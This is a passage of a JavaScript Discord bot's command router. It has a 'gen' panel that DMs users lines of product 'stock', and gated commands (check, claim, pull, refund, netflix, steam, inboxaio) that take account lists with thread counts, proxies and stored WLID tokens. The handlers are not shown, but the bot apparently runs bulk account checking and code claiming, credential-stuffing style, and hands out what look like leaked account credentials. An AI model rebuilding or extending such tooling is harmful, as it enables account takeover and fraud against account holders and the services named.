  if (!isOwner(cid)) return respond({ embeds: [errorEmbed("Owner only.")] });
  return respond({ embeds: [detailedStatsEmbed(statsManager.getSummary(), statsManager.getTopUsers(5))] });
}

// ── Gen panel ───────────────────────────────────────────────

const GEN_HELP_TEXT = [
  "Gen Panel",
  "================================",
  "",
  "  Public commands",
  "    .gen <product> [amount]   pull stock (user max 1, admin max 50)",
  "    .stock                    list products + counts",
  "    .gen help                 show this menu",
  "",
  "  Admin commands",
  "    .addstock <product> (attach .txt or paste lines)",
  "    .replacegenstock <product> (attach .txt)",
  "    .clearstock <product>",
  "    .deleteproduct <product>",
  "    .downloadgenstock <product>",
  "",
  "  Cooldown",
  "    Users: 200s per product. Admins: none.",
].join("\n");

async function handleGen(message, args) {
  // .gen help
  if ((args[0] || "").toLowerCase() === "help") {
    return message.reply({ embeds: [infoEmbed("Gen Panel", `\`\`\`\n${GEN_HELP_TEXT}\n\`\`\``)] });
  }
  if (args.length < 1) return message.reply({ embeds: [errorEmbed("Usage: `.gen <product> [amount]`  •  `.gen help`")] });
  const product = args[0];
  const amount = parseInt(args[1] || "1", 10) || 1;
  if (!gen.exists(product)) return message.reply({ embeds: [errorEmbed(`Product \`${product}\` does not exist. See \`.stock\`.`)] });
  const owner = isOwner(message.author.id);
  const max = owner ? gen.ADMIN_MAX : gen.USER_MAX;
  if (amount < 1 || amount > max) return message.reply({ embeds: [errorEmbed(`Amount must be 1–${max}.`)] });
  if (!owner) {
    const cd = gen.getCooldown(message.author.id, product);
    if (cd > 0) return message.reply({ embeds: [errorEmbed(`Cooldown: wait **${cd}s** before next \`${product}\` pull.`)] });
  }
  const { items, remaining } = gen.pull(product, amount);
  if (items.length === 0) return message.reply({ embeds: [errorEmbed(`Out of stock for \`${product}\`.`)] });
  if (!owner) gen.setCooldown(message.author.id, product);
  try {
    await message.author.send({ embeds: [infoEmbed(`Gen — ${product}`, `\`\`\`\n${items.join("\n")}\n\`\`\`\nRemaining: **${remaining}**`)] });
    await message.reply({ embeds: [successEmbed(`Sent **${items.length}** ${product} to your DMs. Remaining: **${remaining}**`)] });
  } catch {
    await message.reply({ embeds: [errorEmbed("Couldn't DM you. Enable DMs and try again. Stock not refunded.")] });
  }
}

async function handleStock(message) {
  const list = gen.listProducts();
  if (!list.length) return message.reply({ embeds: [infoEmbed("Stock", "No products available yet.")] });
  const lines = list.map((p) => `• \`${p.name}\` — **${p.count}** in stock`);
  return message.reply({ embeds: [infoEmbed("Stock", lines.join("\n"))] });
}

async function handleAddStock(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const product = args[0];
  if (!product) return message.reply({ embeds: [errorEmbed("Usage: `.addstock <product>` + attach .txt or paste lines")] });
  let lines = args.slice(1).join(" ").split(/[\n,]+/).map((s) => s.trim()).filter(Boolean);
  const att = message.attachments.first();
  if (att) lines = lines.concat(await fetchAttachmentLines(att));
  if (!lines.length) return message.reply({ embeds: [errorEmbed("No lines to add.")] });
  try {
    const added = gen.addStock(product, lines);
    return message.reply({ embeds: [successEmbed(`Added **${added}** to \`${product}\`. Total: **${gen.readLines(product).length}**`)] });
  } catch (e) { return message.reply({ embeds: [errorEmbed(e.message)] }); }
}

async function handleReplaceStock(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const product = args[0];
  if (!product) return message.reply({ embeds: [errorEmbed("Usage: `.replacegenstock <product>` + attach .txt")] });
  const att = message.attachments.first();
  let lines = att ? await fetchAttachmentLines(att) : args.slice(1).join(" ").split(/[\n,]+/).map((s) => s.trim()).filter(Boolean);
  if (!lines.length) return message.reply({ embeds: [errorEmbed("No lines provided.")] });
  try {
    const n = gen.replaceStock(product, lines);
    return message.reply({ embeds: [successEmbed(`Replaced \`${product}\`. Total: **${n}**`)] });
  } catch (e) { return message.reply({ embeds: [errorEmbed(e.message)] }); }
}

async function handleClearStock(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const product = args[0];
  if (!product || !gen.exists(product)) return message.reply({ embeds: [errorEmbed("Unknown product.")] });
  gen.clearStock(product);
  return message.reply({ embeds: [successEmbed(`Cleared \`${product}\`.`)] });
}

async function handleDeleteProduct(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const product = args[0];
  if (!product) return message.reply({ embeds: [errorEmbed("Usage: `.deleteproduct <product>`")] });
  if (!gen.deleteProduct(product)) return message.reply({ embeds: [errorEmbed("Unknown product.")] });
  return message.reply({ embeds: [successEmbed(`Deleted \`${product}\`.`)] });
}

async function handleDownloadStock(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const product = args[0];
  if (!product || !gen.exists(product)) return message.reply({ embeds: [errorEmbed("Unknown product.")] });
  const lines = gen.readLines(product);
  const att = new AttachmentBuilder(Buffer.from(lines.join("\n"), "utf-8"), { name: `${product}.txt` });
  return message.reply({ embeds: [infoEmbed("Stock dump", `\`${product}\` — ${lines.length} lines`)], files: [att] });
}

// ── Anti-link admin ─────────────────────────────────────────

async function handleAntilink(message, args) {
  if (!isOwner(message.author.id)) return message.reply({ embeds: [errorEmbed("Owner only.")] });
  const sub = (args[0] || "").toLowerCase();
  if (sub === "addchannel") {
    const ch = (args[1] || message.channelId).replace(/[<#>]/g, "");
    antilink.addChannel(ch);
    return message.reply({ embeds: [successEmbed(`Anti-link enabled in <#${ch}>.`)] });
  }
  if (sub === "removechannel") {
    const ch = (args[1] || message.channelId).replace(/[<#>]/g, "");
    antilink.removeChannel(ch);
    return message.reply({ embeds: [successEmbed(`Anti-link removed from <#${ch}>.`)] });
  }
  if (sub === "whitelist") {
    const id = (args[1] || "").replace(/[<@!>]/g, "");
    if (!id) return message.reply({ embeds: [errorEmbed("Usage: `.antilink whitelist <@user>`")] });
    antilink.addUser(id);
    return message.reply({ embeds: [successEmbed(`<@${id}> may now post links.`)] });
  }
  if (sub === "unwhitelist") {
    const id = (args[1] || "").replace(/[<@!>]/g, "");
    antilink.removeUser(id);
    return message.reply({ embeds: [successEmbed(`<@${id}> removed from whitelist.`)] });
  }
  if (sub === "list") {
    return message.reply({ embeds: [infoEmbed("Anti-link",
      `Channels: ${antilink.getChannels().map((c) => `<#${c}>`).join(", ") || "none"}\nWhitelist: ${antilink.getWhitelist().map((u) => `<@${u}>`).join(", ") || "none"}`
    )] });
  }
  return message.reply({ embeds: [infoEmbed("Anti-link", "Subs: `addchannel [#ch]`, `removechannel [#ch]`, `whitelist <@user>`, `unwhitelist <@user>`, `list`")] });
}

// ── Stop button ─────────────────────────────────────────────

client.on("interactionCreate", async (interaction) => {
  if (interaction.isButton() && interaction.customId.startsWith("stop_")) {
    const target = interaction.customId.replace("stop_", "");
    if (interaction.user.id !== target && !isOwner(interaction.user.id)) {
      return interaction.reply({ content: "Only the command author can stop this.", ephemeral: true });
    }
    const ac = activeAborts.get(target);
    if (ac) { ac.abort(); await interaction.reply({ embeds: [infoEmbed("Stopped", "Process stopping.")], ephemeral: true }); }
    else await interaction.reply({ content: "No active process.", ephemeral: true });
    return;
  }
  if (interaction.isStringSelectMenu() && interaction.customId === "help_category") {
    await interaction.update({ embeds: [helpCategoryEmbed(interaction.values[0], config.PREFIX)], components: [helpSelectMenu()] });
  }
});

// ── Dot commands ────────────────────────────────────────────

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  // Anti-link (run before prefix check, but admins/whitelist/owner exempt)
  if (
    !message.author.bot &&
    antilink.isProtected(message.channelId) &&
    !isOwner(message.author.id) &&
    !antilink.isWhitelisted(message.author.id) &&
    !message.member?.permissions?.has?.("Administrator") &&
    antilink.containsLink(message.content)
  ) {
    try { await message.delete(); } catch {}
    try {
      const warn = await message.channel.send(`${message.author}, nice try diddy.. no links allowed`);
      setTimeout(() => warn.delete().catch(() => {}), 5000);
    } catch {}
    return;
  }

  // Autopilot 'milk' redemption — works in any channel
  if (autopilot.isEnabled() && message.content.trim().toLowerCase() === "milk" && autopilot.wasPrompted(message.author.id) && !auth.isAuthorized(message.author.id) && !isOwner(message.author.id) && !blacklist.isBlacklisted(message.author.id)) {
    auth.authorize(message.author.id, autopilot.TEN_DAYS_MS, "autopilot");
    autopilot.clearPrompted(message.author.id);
    try { await message.reply({ embeds: [successEmbed("Autopilot granted: 10 days of access. Welcome.")] }); } catch {}
    return;
  }

  if (!message.content.startsWith(config.PREFIX)) return;
  const args = message.content.slice(config.PREFIX.length).trim().split(/\s+/);
  const cmd = args.shift()?.toLowerCase();
  if (!cmd) return;

  // Channel enforcement (only for the bot's heavy commands)
  const channelCheck = checkChannelAccess(message.channelId, cmd);
  if (!channelCheck.allowed) {
    return message.reply({ embeds: [errorEmbed(`This command can only be used in <#${channelCheck.requiredChannel}>.`)] });
  }

  const respond = (opts) => message.reply(opts);

  // Welcome DM (only ever once per user, persisted)
  await sendWelcomeIfNeeded(message.author);

  // Commands that don't require auth: help, stock, gen help, say (owner), dm (owner), autopilot* (owner), antilink* (owner)
  // Other heavy commands gate via ensureAuthorized.

  try {
    if (cmd === "help") return respond({ embeds: [helpOverviewEmbed(config.PREFIX)], components: [helpSelectMenu()] });
    if (cmd === "stats") return handleStats(respond);

    // Owner utility
    if (cmd === "say") {
      if (!isOwner(message.author.id)) return respond({ embeds: [errorEmbed("Owner only.")] });
      const text = args.join(" ");
      if (!text) return respond({ embeds: [errorEmbed("Usage: `.say <message>`")] });
      try { await message.delete(); } catch {}
      return message.channel.send(text);
    }

    if (cmd === "dm") {
      if (!isOwner(message.author.id)) return respond({ embeds: [errorEmbed("Owner only.")] });
      const tid = (args[0] || "").replace(/[<@!>]/g, "");
      const text = args.slice(1).join(" ");
      if (!tid || !text) return respond({ embeds: [errorEmbed("Usage: `.dm <user_or_id> <message>`")] });
      try {
        const u = await client.users.fetch(tid);
        await u.send(text);
        return respond({ embeds: [successEmbed(`DM sent to <@${tid}>.`)] });
      } catch (e) { return respond({ embeds: [errorEmbed(`Could not DM: ${e.message}`)] }); }
    }

    if (cmd === "autopilotoff") {
      if (!isOwner(message.author.id)) return respond({ embeds: [errorEmbed("Owner only.")] });
      autopilot.setEnabled(false);
      return respond({ embeds: [successEmbed("Autopilot **disabled**.")] });
    }
    if (cmd === "autopiloton") {
      if (!isOwner(message.author.id)) return respond({ embeds: [errorEmbed("Owner only.")] });
      autopilot.setEnabled(true);
      return respond({ embeds: [successEmbed("Autopilot **enabled** (10-day access on `milk`).")] });
    }

    if (cmd === "antilink") return handleAntilink(message, args);

    // Gen panel — public except admin subs
    if (cmd === "gen") return handleGen(message, args);
    if (cmd === "stock") return handleStock(message);
    if (cmd === "addstock") return handleAddStock(message, args);
    if (cmd === "replacegenstock") return handleReplaceStock(message, args);
    if (cmd === "clearstock") return handleClearStock(message, args);
    if (cmd === "deleteproduct") return handleDeleteProduct(message, args);
    if (cmd === "downloadgenstock") return handleDownloadStock(message, args);

    // Auth admin
    if (cmd === "auth") {
      if (args.length < 2) return respond({ embeds: [errorEmbed("Usage: `.auth <@user> <duration>`")] });
      return handleAuth(respond, message.author.id, args[0].replace(/[<@!>]/g, ""), args.slice(1).join(" "));
    }
    if (cmd === "deauth") {
      if (!args[0]) return respond({ embeds: [errorEmbed("Usage: `.deauth <@user>`")] });
      return handleDeauth(respond, message.author.id, args[0].replace(/[<@!>]/g, ""));
    }
    if (cmd === "authlist") return handleAuthList(respond);
    if (cmd === "blacklist") {
      if (!args[0]) return respond({ embeds: [errorEmbed("Usage: `.blacklist <@user> [reason]`")] });
      return handleBlacklist(respond, message.author.id, args[0].replace(/[<@!>]/g, ""), args.slice(1).join(" "));
    }
    if (cmd === "unblacklist") {
      if (!args[0]) return respond({ embeds: [errorEmbed("Usage: `.unblacklist <@user>`")] });
      return handleUnblacklist(respond, message.author.id, args[0].replace(/[<@!>]/g, ""));
    }
    if (cmd === "blacklistshow") return handleBlacklistShow(respond);
    if (cmd === "admin") return handleAdminPanel(respond, message.author.id);
    if (cmd === "setwebhook") return handleSetWebhook(respond, message.author.id, args[0]);
    if (cmd === "botstats") return handleBotStats(respond, message.author.id);

    if (cmd === "wlidset") {
      if (!isOwner(message.author.id)) return respond({ embeds: [errorEmbed("Owner only.")] });
      return handleWlidSet(respond, message.author.id, args.join(" "), message.attachments.first());
    }

    // Heavy commands — require auth
    if (!(await ensureAuthorized(message))) return;

    const att = message.attachments.first();
    const raw = args.join(" ");

    if (cmd === "check") return handleCheck(respond, message.author.id, "", raw, att, 4, message.author);
    if (cmd === "claim") return handleClaim(respond, message.author.id, raw, att, 4, message.author);
    if (cmd === "pull") return handlePull(respond, message.author.id, raw, att, message.author, message.author.username);
    if (cmd === "promopuller") return handlePromoPuller(respond, message.author.id, raw, att, message.author, message.author.username);
    if (cmd === "inboxaio") return handleInboxAio(respond, message.author.id, raw, att, 4, message.author);
    if (cmd === "rewards") return handleRewards(respond, message.author.id, raw, att, 3, message.author);
    if (cmd === "refund") return handleRefund(respond, message.author.id, raw, att, 5, message.author, message.author.username);
    if (cmd === "netflix") return handleNetflix(respond, message.author.id, raw, att, 10, message.author);
    if (cmd === "steam") return handleSteam(respond, message.author.id, raw, att, 15, message.author);

    // Unknown command — silent
  } catch (err) {
    console.error(`Prefix command error [${cmd}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Slash commands (kept minimal — same routing) ────────────

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const { commandName, user } = interaction;
  const channelCheck = checkChannelAccess(interaction.channelId, commandName);
  if (!channelCheck.allowed) {
    return interaction.reply({ embeds: [errorEmbed(`Use this in <#${channelCheck.requiredChannel}>.`)], ephemeral: true });
  }
  const respond = (opts) => (interaction.deferred || interaction.replied) ? interaction.editReply(opts) : interaction.reply(opts);
  await sendWelcomeIfNeeded(user);

  try {
    if (commandName === "help") return respond({ embeds: [helpOverviewEmbed("/")], components: [helpSelectMenu()] });
    if (commandName === "stats") return handleStats(respond);
    if (commandName === "auth") return handleAuth(respond, user.id, interaction.options.getUser("user").id, interaction.options.getString("duration"));
    if (commandName === "deauth") return handleDeauth(respond, user.id, interaction.options.getUser("user").id);
    if (commandName === "authlist") return handleAuthList(respond);
    if (commandName === "blacklist") return handleBlacklist(respond, user.id, interaction.options.getUser("user").id, interaction.options.getString("reason"));
    if (commandName === "unblacklist") return handleUnblacklist(respond, user.id, interaction.options.getUser("user").id);
    if (commandName === "blacklistshow") return handleBlacklistShow(respond);
    if (commandName === "admin") return handleAdminPanel(respond, user.id);
    if (commandName === "setwebhook") return handleSetWebhook(respond, user.id, interaction.options.getString("url"));
    if (commandName === "botstats") return handleBotStats(respond, user.id);
    if (commandName === "wlidset") return handleWlidSet(respond, user.id, interaction.options.getString("wlids"), interaction.options.getAttachment("wlids_file"));

    // Heavy commands — gate
    if (!canUse(user.id)) return respond({ embeds: [errorEmbed("Not authorized. Use the bot via dot commands and follow the autopilot prompt.")] });
    await interaction.deferReply();

    if (commandName === "check") return handleCheck(respond, user.id, interaction.options.getString("wlids"), interaction.options.getString("codes"), interaction.options.getAttachment("codes_file"), interaction.options.getInteger("threads") || 4, user);
    if (commandName === "claim") return handleClaim(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 4, user);
    if (commandName === "pull") return handlePull(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), user, user.username);
    if (commandName === "promopuller") return handlePromoPuller(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), user, user.username);
    if (commandName === "inboxaio") return handleInboxAio(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 4, user);
    if (commandName === "refund") return handleRefund(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 5, user, user.username);
    if (commandName === "netflix") return handleNetflix(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
    if (commandName === "steam") return handleSteam(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 15, user);
    if (commandName === "rewards") return handleRewards(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 3, user);
  } catch (err) {
    console.error(`Slash error [${commandName}]:`, err);
    try { await respond({ embeds: [errorEmbed(err.message)] }); } catch {}
  }
});

// ── Ready ───────────────────────────────────────────────────

client.once("ready", () => {
  console.log(`Bot online as ${client.user.tag}`);
  const proxyCount = loadProxies();
  console.log(`Proxies: ${config.USE_PROXIES ? `Enabled (${proxyCount})` : "Disabled"}`);
  const presence = [
    () => ({ name: ".gg/autizmens", type: 3 }),
    () => ({ name: `${getWlidCount()} WLIDs stored`, type: 3 }),
    () => ({ name: `${auth.getAllAuthorized().length} authorized`, type: 3 }),
    () => ({ name: ".help | .pull | .gen", type: 2 }),
  ];
  let i = 0;
  const cycle = () => { try { client.user.setPresence({ status: "online", activities: [presence[i++ % presence.length]()] }); } catch {} };
  cycle(); setInterval(cycle, 15000);
});

client.login(config.BOT_TOKEN);
